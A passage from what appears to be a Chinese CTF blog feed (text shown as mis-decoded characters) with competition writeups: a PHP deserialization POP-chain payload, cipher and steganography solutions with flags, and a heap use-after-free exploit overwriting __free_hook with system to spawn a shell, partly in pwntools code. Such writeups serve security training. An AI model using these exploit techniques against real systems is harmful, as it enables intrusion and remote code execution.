class="variable">$ser</span>);</span><br></pre></td></tr></table></figure><blockquote><p>åé¢å‘ç°é™¤äº†å¸¸è§„æ€è·¯ï¼Œè¿˜æœ‰åˆ«çš„ã€‚è€Œä¸”æ˜¯åŸé¢˜ğŸ˜…ï¼Œå…·ä½“è§æ–‡ç« ï¼š<a href="https://blog.csdn.net/qq_45619909/article/details/122803600">åˆ©ç”¨PHPåƒåœ¾å›æ”¶æœºåˆ¶æ„é€ POPé“¾</a> ğŸ˜…</p></blockquote><p>æ–‡ç« ä¸­å¦ä¸€ç§æ€è·¯æ˜¯åˆ©ç”¨åƒåœ¾å›æ”¶æœºåˆ¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># chao code.</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func =<span class="string">&quot;Test::getFlag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">array</span>(<span class="keyword">new</span> B, <span class="keyword">new</span> B);</span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">&quot;i:0;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> B);</span><br><span class="line"><span class="variable">$a</span> =  <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$z</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$tmp</span>,<span class="variable">$tmp</span>.<span class="string">&quot; &quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:3:&quot;Fun&quot;:1:&#x27;</span>,<span class="string">&#x27;O:3:&quot;Fun&quot;:2:&#x27;</span>,<span class="variable">$z</span>));</span><br></pre></td></tr></table></figure><blockquote><p>æ›´å¤šè¯¦æƒ…å‚è€ƒå¦‚ä¸‹ï¼š</p><p><a href="https://www.anquanke.com/post/id/149421">å¦‚ä½•æ”»ç ´PHPçš„åƒåœ¾å›æ”¶å’Œååºåˆ—åŒ–æœºåˆ¶ï¼ˆä¸Šï¼‰</a></p><p><a href="https://www.anquanke.com/post/id/149424">å¦‚ä½•æ”»ç ´PHPçš„åƒåœ¾å›æ”¶å’Œååºåˆ—åŒ–æœºåˆ¶ï¼ˆä¸‹ï¼‰</a></p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ç­¾ä¸ªåˆ°"><a href="#ç­¾ä¸ªåˆ°" class="headerlink" title="ç­¾ä¸ªåˆ°"></a>ç­¾ä¸ªåˆ°</h3><p><a href="https://github.com/Ciphey/Ciphey">Ciphey</a></p><p><a href="https://blog.csdn.net/qq_35493457/article/details/123781939">Cipheyå®‰è£…æŠ¥é”™è§£å†³</a></p><blockquote><p>âš¡ Automatically decrypt encryptions without knowing the key or cipher, decode encodings, and crack hashes âš¡</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Tao in ~\Downloads Î» ciphey.exe -f .\26.txt -C regex -p regex.regex=flag</span><br><span class="line">â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®</span><br><span class="line">â”‚ Formats used:                                          â”‚</span><br><span class="line">â”‚    caesar:                                                 â”‚</span><br><span class="line">â”‚     Key: 13                                                â”‚</span><br><span class="line">â”‚    base32                                                  â”‚</span><br><span class="line">â”‚    utf8Plaintext: &quot;flag&#123;5dcf3d3407891ba725ffd13224de5435&#125;&quot; â”‚</span><br><span class="line">â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯</span><br></pre></td></tr></table></figure><h3 id="where-is-secret"><a href="#where-is-secret" class="headerlink" title="where_is_secret"></a>where_is_secret</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> ciphey.exe -f .\vig.txt</span><br><span class="line"># è·‘äº†åŠä¸ªå°æ—¶ï¼Œå‘ç°key-&gt;gwhtgwht,è¿˜æœ‰ä¸ªå¯†ç ï¼Œä½†å¯†ç ä¸å¯¹</span><br></pre></td></tr></table></figure><p>two years laterâ€¦â€¦</p><p>å°è¯•ä½¿ç”¨key-&gt;<code>gwht</code>, ç»´å‰å°¼äºšè§£å¯†</p><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220904111005032.png"></p><p>å“å“å“ï¼Œå°±æ˜¯ç©ã€‚çŒœçš„å¾ˆå¼€å¿ƒğŸ˜‡</p><p>è§£å‹å‡ºbmpåï¼Œæ ¹æ®é¢˜ç›®ç»™çš„hint,åœ¨ç½‘ä¸Šæ‰¾åˆ°è§£å¯†è„šæœ¬ï¼ˆå›¾ç‰‡è—å°è¯´ã€‚ã€‚ã€‚ï¼‰</p><blockquote><p><a href="https://blog.csdn.net/weixin_54581900/article/details/122740876">https://blog.csdn.net/weixin_54581900/article/details/122740876</a></p></blockquote><p>è¿è¡Œè§£å¯†åï¼Œæ–‡æœ¬æ˜¯<code>è‡ªå‘ä¸è¶…è¶Š</code></p><p><img src="/2022/09/04/2022%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BWriteup/image-20220904111311559.png"></p><p>å‘ç°å°è¯´ä¸­ç©¿æ’ç€flag,two years laterâ€¦</p><p>æ ¹æ®æ··æ‚ç©¿æ’ç‰¹å¾æ‰‹åŠ¨å¾—åˆ°flagä¸º<code>h1d3_1n_th3_p1ctur3</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 2022å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±Šé¹¤åŸæ¯æ²³å—-é¹¤å£CTFç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›åˆèµ›</title>
      <link href="/2022/08/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AF%E6%B2%B3%E5%8D%97-%E9%B9%A4%E5%A3%81CTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2022/08/31/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%B9%A4%E5%9F%8E%E6%9D%AF%E6%B2%B3%E5%8D%97-%E9%B9%A4%E5%A3%81CTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>åˆèµ›çº¿ä¸Šç­”é¢˜</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> ç¬¬äºŒå±Šé¹¤åŸæ¯æ²³å—-é¹¤å£CTFç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›åˆèµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022å¹´ç¬¬ä¸‰å±Šç½‘é¼æ¯é’é¾™ç»„-NULL</title>
      <link href="/2022/08/26/2022%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84-NULL/"/>
      <url>/2022/08/26/2022%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84-NULL/</url>
      
        <content type="html"><![CDATA[<blockquote><p>NULL</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> 2022å¹´ç¬¬ä¸‰å±Šç½‘é¼æ¯é’é¾™ç»„ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±Šé•¿åŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›-NULL</title>
      <link href="/2022/08/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-NULL/"/>
      <url>/2022/08/23/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-NULL/</url>
      
        <content type="html"><![CDATA[<blockquote><p>NULL</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2022 </tag>
            
            <tag> ç¬¬äºŒå±Šé•¿åŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022å·…å³°æå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ›åˆèµ›Writeup</title>
      <link href="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/"/>
      <url>/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>By ACT Team. 2022.8.18</p></blockquote><p>æœ¬æ¬¡æ¯”èµ›å…±æœ‰3ä¸ªPwné¢˜ï¼Œæœ‰ä¸€é¢˜æ˜¯åœ¨èµ›åè§£å‡º</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818123627268.png"></p><hr><h3 id="1-Gift"><a href="#1-Gift" class="headerlink" title="1.Gift"></a>1.Gift</h3><h4 id="1-1-é€†å‘åˆ†æ"><a href="#1-1-é€†å‘åˆ†æ" class="headerlink" title="1.1 é€†å‘åˆ†æ"></a>1.1 é€†å‘åˆ†æ</h4><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818123934659.png"></p><p>åœ¨<code>delete</code>åŠŸèƒ½ä¸­å †æŒ‡é’ˆæœªç½®ç©ºå­˜åœ¨<code>UAF</code>ï¼Œä½†æ˜¯ç¨‹åºä¸­æ²¡æœ‰<code>edit</code>åŠŸèƒ½æœ‰ç‚¹é¸¡è‚‹</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818124054555.png"></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818124347880.png"></p><p>å¦å¤–è¿˜å­˜åœ¨ä¸€ä¸ª<code>backdoor</code>çš„åŠŸèƒ½ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶<code>delete</code>åçš„<code>tcache fd</code>æŒ‡é’ˆï¼Œä½†æ˜¯é™åˆ¶åªèƒ½æ˜¯å‡å»<code>0x10</code>åŠä»¥å†…çš„å€¼ï¼Œå¯ä»¥é€šè¿‡å‡å»è´Ÿæ•°æ¥ç»•è¿‡è¾¾åˆ°åŠ çš„æ•ˆæœï¼Œéœ€è¦æ³¨æ„<code>read_num</code>å‡½æ•°ä¸­è¿”å›å€¼æ˜¯æ— ç¬¦å·æ•´æ•°ï¼Œé‚£ä¹Ÿå¯¼è‡´åŠ çš„èŒƒå›´æœ‰é™ï¼Œæ‰€ä»¥ä¿®æ”¹çš„<code>fd</code>æŒ‡é’ˆèŒƒå›´åº”è¯¥åœ¨<code>heap</code>æ®µå†…</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818125635331.png"></p><p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯<code>add</code>åŠŸèƒ½ä¸­æœ‰è®¡æ•°å™¨ï¼Œåªèƒ½ç”³è¯·<code>10</code>ä¸ªå †å—ï¼Œåˆå› ä¸ºå­˜åœ¨<code>UAF</code>æŒ‡é’ˆæœªæ¸…ç©ºçš„è¯ï¼Œå¯¼è‡´åªèƒ½ä½¿ç”¨<code>10</code>æ¬¡<code>add</code>ï¼Œ<code>idx</code>èŒƒå›´æ˜¯<code>0-9</code>ï¼Œç›¸å¯¹äºä¸€èˆ¬çš„å †é¢˜å¯ä»¥<code>add</code>çš„æ¬¡æ•°æ¯”è¾ƒå°‘ï¼Œå¦å¤–é™åˆ¶äº†<code>size</code>ï¼Œåªæœ‰å›ºå®šçš„ä¸¤ç§é€‰æ‹©<code>0x100</code>æˆ–è€…<code>0x60</code>ï¼Œé‚£ä¹ˆè¦é€šè¿‡<code>unsorted bin</code>æ³„éœ²<code>libc</code>çš„è¯ï¼Œç›´æ¥éœ€è¦8ä¸ªå †å—(7ä¸ªå¡«å……<code>tcache</code>)ï¼Œè¿™é‡Œå°±æ˜¯é¢˜ç›®é‡Œçš„ä¸»è¦é™åˆ¶ï¼Œè¦å·§å¦™çš„è¿›è¡Œå †é£æ°´å¸ƒå±€</p><h4 id="1-2-libcç‰ˆæœ¬"><a href="#1-2-libcç‰ˆæœ¬" class="headerlink" title="1.2 libcç‰ˆæœ¬"></a>1.2 libcç‰ˆæœ¬</h4><p>æœ¬é¢˜æ²¡æœ‰ç»™å‡º<code>libc</code>æ–‡ä»¶ï¼Œç”±äºç¨‹åºå­˜åœ¨<code>UAF</code>ï¼Œé€šè¿‡<code>double free</code>å°è¯•çœ‹æŠ¥é”™ä¿¡æ¯ï¼ˆè¿™é‡Œæˆ‘æ˜¯åœ¨æœ¬åœ°è§¦å‘ï¼‰</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818125105879.png"></p><p>ä¼šæœ‰<code>tcache</code>ç›¸å…³çš„æŠ¥é”™ï¼Œè¯´æ˜libcç‰ˆæœ¬<code>&gt;=2.27</code>ï¼Œç„¶åå°±æ‰¾äº†ä¸€äº›å¸¸ç”¨çš„libcç‰ˆæœ¬æµ‹è¯•ï¼Œæœ€åå‘ç°ç›´æ¥ç”¨æˆ‘çš„ubuntu18è™šæ‹Ÿæœºè‡ªèº«çš„libcå°±æ‰“é€šäº†</p><h4 id="1-3-è§£é¢˜"><a href="#1-3-è§£é¢˜" class="headerlink" title="1.3 è§£é¢˜"></a>1.3 è§£é¢˜</h4><p>ç”³è¯·7ä¸ªå †å—ï¼Œç„¶åæŒ‰ç‰¹å®šé¡ºåºéƒ½freeæ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]   <span class="comment">#0-4</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>))            <span class="comment">#5,include fake_chunk</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)                       <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">[delete(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">delete(<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ ·åšçš„ç›®çš„æ˜¯ä¹‹åæ„é€ å‡º<code>tcache</code>é‡Œé¢<code>chunk5-&gt;fake_chunk</code>çš„çŠ¶æ€ï¼Œå› ä¸ºä½¿ç”¨<code>backdoor</code>åŠŸèƒ½ä¿®æ”¹<code>fd</code>æœ‰é™åˆ¶ï¼Œåªæœ‰ä½¿ç”¨è´Ÿæ•°æ‰èƒ½å¤§å¹…åº¦ä¿®æ”¹<code>fd</code>ï¼Œè€Œè´Ÿæ•°åˆæ˜¯å¢åŠ <code>fd</code>æŒ‡é’ˆçš„æ•ˆæœï¼Œæ‰€ä»¥æŠŠå…³é”®çš„<code>chunk5</code>å¸ƒå±€åˆ°ç›¸å¯¹åé¢çš„ä½ç½®*(ä¹‹åè¿˜è¦é€šè¿‡<code>fake_chunk</code>æ¥æ§åˆ¶<code>chunk6</code>)*ï¼Œç„¶å<code>chunk5</code>æœ€ååˆ é™¤ï¼Œè¿™æ ·<code>chunk5_fd</code>çš„å€¼å°±ä¼šå°äº<code>fake_chunk_addr</code>ï¼Œä¹‹åé€šè¿‡<code>backdoor</code>åŠŸèƒ½å¢åŠ fdå€¼åç§»åˆ°<code>fake_chunk</code>çš„ä½ç½®</p><p>æ¥ç€é€šè¿‡<code>unsorted bin</code>çš„æŒ‡é’ˆæ¥æ³„éœ²<code>libc</code>ï¼Œæ³¨æ„è¿™é‡Œå†æ¬¡<code>free chunk0</code>ï¼Œå› ä¸ºæˆ‘ä»¬ä¿®æ”¹äº†å¤´èŠ‚ç‚¹æŒ‡é’ˆ(<code>chunk6_fd</code>)åï¼Œå †ç®¡ç†å™¨å°±æ‰¾ä¸ç€åˆšå¼€å§‹freeæ‰çš„å †å—äº†ï¼Œæ‰€ä»¥è‡ªç„¶ä¸ä¼šè§¦å‘<code>double free</code>çš„æŠ¥é”™ï¼Œåˆšå¼€å§‹å·²ç»åˆ äº†7ä¸ªå †å—ï¼Œé‚£ä¹ˆå°±å¡«æ»¡äº†<code>tcache</code>ï¼Œå†æ¬¡<code>free chunk0</code>å°±ä¼šè¿›å…¥<code>unsorted bin</code>ï¼Œè¿™é‡Œåªè¦ä¸æ˜¯<code>chunk6</code>(è¿˜åœ¨tcacheé“¾ä¸­) freeå“ªä¸ªå †å—éƒ½è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#UAF edit chunk6_fd-&gt;fake_chunk</span></span><br><span class="line">backdoor(<span class="number">5</span>,-<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line"><span class="comment">#ç”±äºå‰é¢å·²ç»ä¿®æ”¹è¿‡fdï¼Œæ‰€ä»¥å†æ¬¡free chunk0ä¸ä¼šè§¦å‘æ£€æŸ¥</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;cost: &#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)) -<span class="number">0x10</span> -<span class="number">96</span> -libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#libc_base = int(p.recvuntil(b&#x27;\n&#x27;))-0x3ebca0</span></span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p>å‰é¢åšçš„å·¥ä½œéƒ½æ˜¯é“ºå«ï¼Œç°åœ¨æ¥åˆ°é‡ç‚¹ï¼Œæˆ‘ä»¬è¦æ„é€ å‡º<code>tcache</code>é“¾è¡¨çŠ¶æ€å¦‚ä¸‹ï¼š</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818133312144.png"></p><p>é¦–å…ˆç”³è¯·åˆ°<code>chunk5</code>ï¼ˆæ­¤æ—¶<code>idx</code>æ˜¯<code>7</code>ï¼Œ<code>chunk5_ptr</code>ç­‰äº<code>chunk7_ptr</code>ï¼‰ï¼Œç„¶åé©¬ä¸Šä¿®æ”¹<code>fake_chunk</code>çš„<code>fd</code>ï¼Œè®©<code>fake_chunk_fd-&gt;free_hook</code>ï¼Œå°±æ­£å¥½ä½¿ç”¨3æ¬¡<code>add</code>åŠŸèƒ½æ§åˆ¶åˆ°<code>free_hook</code>åŠ ä¸Šåˆšå¼€å§‹çš„7ä¸ªå †å—å…±æ˜¯10æ¬¡ï¼Œç„¶åè¿™é‡Œè¦æ³¨æ„çš„æ˜¯ç¨‹åºçš„åŠŸèƒ½ä¸­å †å—å†…å®¹åŒºå¼€å¤´çš„<code>0x10</code>å­—èŠ‚å¦æœ‰ç”¨é€”æ— æ³•ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¬¬äºŒæ¬¡ç”³è¯·è·å¾—<code>fake_chunk</code>çš„æ—¶å€™ä¿®æ”¹<code>chunk6_content</code>ä¸º<code>/bin/sh</code>ï¼Œç¬¬ä¸‰æ¬¡ç”³è¯·è·å¾—<code>free_hook</code>ä¿®æ”¹ä¸º<code>system</code>ã€‚å…³äºè¿™é‡Œä¸ºä»€ä¹ˆæ²¡æœ‰ç›´æ¥ä½¿ç”¨<code>one_gadget</code>çš„åŸå› è§£é‡Šä¸‹ï¼Œä¸»è¦æ˜¯libcç‰ˆæœ¬æœªçŸ¥ï¼Œè€Œä¸åŒlibcç‰ˆæœ¬one_gadgetä½ç½®ä¸åŒå†…å­˜çŠ¶æ€ä¹Ÿä¸ä¼šä¸€æ¨¡ä¸€æ ·ï¼Œä¸å¥½é€‰ç”¨å“ªä¸ªone_gadgetï¼Œéœ€è¦ä¸€å®šçš„è°ƒè¯•æ—¶é—´ï¼Œä½¿ç”¨<code>system(&#39;/bin/sh&#39;)</code>çš„æ–¹å¼å°±æ¯”è¾ƒç¨³å¦¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç”³è¯·å›chunk5,ä¿®æ”¹å…¶ä¸­fake_chunk_fd</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(free_hook-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;z&#x27;</span>*<span class="number">8</span>)   <span class="comment">#chunk5,idx=7</span></span><br><span class="line"><span class="comment">#ä»fake_chunkå¼€å§‹å¡«å……ï¼Œä¿®æ”¹chunk6_content</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)            <span class="comment">#fake_chunk,idx=8</span></span><br><span class="line">add(<span class="number">1</span>,p64(system))                                           <span class="comment">#free_hook,idx=9</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œå®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span 